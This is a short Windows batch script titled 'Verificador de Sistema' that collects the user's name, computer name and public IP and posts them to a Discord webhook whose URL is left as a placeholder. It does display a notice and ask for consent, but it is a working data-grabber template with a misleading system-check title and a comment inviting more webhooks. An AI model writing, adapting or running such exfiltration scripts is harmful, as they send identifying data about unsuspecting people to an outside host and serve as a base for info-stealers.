@echo off
title Verificador de Sistema
setlocal enabledelayedexpansion

echo ======================================================
echo           Security Alert ! (<-- TF?)
echo ======================================================
echo.
echo this script will grab your info and send it somewhere
echo in a discord server / webhook
echo.

choice /C SN /M "Do you want to continue?"

if errorlevel 2 (
    echo.
    echo [!] User canceled Script.
    timeout /t 3 >nul
    exit /b
)

echo.
echo [+] Getting IP
for /f "delims=" %%a in ('curl -s https://api.ipify.org') do set "IP=%%a"

echo [+] Sending data to Discord...

set "URL=https://discord.com/api/webhooks/Your webhook"
:: if do you want to add antother webhook you can modify it adding for example a URL2 Variable

set "MSG=Usuario: %USERNAME% - PC: %COMPUTERNAME% - IP: %IP%"

curl -H "Content-Type: application/json" -d "{\"content\": \"%MSG%\"}" %URL%

echo.
echo.
echo [+] Ok, Process Ended.
pause
